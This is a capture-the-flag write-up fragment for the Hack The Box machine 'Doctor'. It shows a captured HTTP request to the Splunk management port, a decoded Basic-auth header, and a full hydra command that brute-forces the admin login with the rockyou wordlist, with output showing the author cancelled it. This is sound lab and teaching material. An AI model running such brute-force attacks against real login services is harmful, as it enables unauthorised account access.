# Bruteforcing logins to splunkd service

First let's understand how Web logins are passed to splunkd server. Here I tried username/password test/test.

```text
GET /services HTTP/1.1
Host: doctors.htb:8089
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://doctors.htb:8089/
Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.X7_KAg.G6zWByHY0kh9YhabHjuG1Ihayfk
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic dGVzdDp0ZXN0
```

It doesn't look like anything was passed but the last line when base64 decoded returned

```shell
root@kali:~/CTF/HTB/Doctor# echo dGVzdDp0ZXN0 | base64 -d
test:test
```

We can use hydra for this. Note the login uses something called HTTP Basic Authentication so I Googled for that with hydra and found [this page](https://github.com/gnebbia/hydra_notes). I tried it (assuming username was admin)

```shell
root@Kali:~/HTB/Doctor# hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 -T 64 -s 8089 doctors.htb https-head /services -v -f
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-27 00:57:28
[WARNING] http-head auth does not work with every server, better use http-get
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-heads://doctors.htb:8089/services
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 15507.00 tries/min, 15507 tries in 00:01h, 14328892 to do in 15:25h, 64 active
[STATUS] 14987.33 tries/min, 44962 tries in 00:03h, 14299437 to do in 15:55h, 64 active
^C[ERROR] Received signal 2, going down ...
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

It took so long so I cancelled it.